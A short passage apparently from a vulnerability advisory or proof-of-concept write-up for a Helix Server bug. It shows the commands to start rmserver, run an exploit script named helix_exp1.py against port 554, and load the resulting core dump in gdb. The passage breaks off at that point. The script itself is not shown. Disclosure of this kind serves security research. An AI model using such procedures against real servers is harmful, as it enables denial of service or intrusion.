It is very easy to exploit this bug if your connection to a server is the first
connection since the server's start.
Example:

Run Helix Server:
# ./Bin/rmserver --acd --nca --nar rmserver.cfg

Run this script:
$ python helix_exp1.py localhost 554

# gdb -q ./Bin/rmserver  core.6017
(no debugging symbols found)
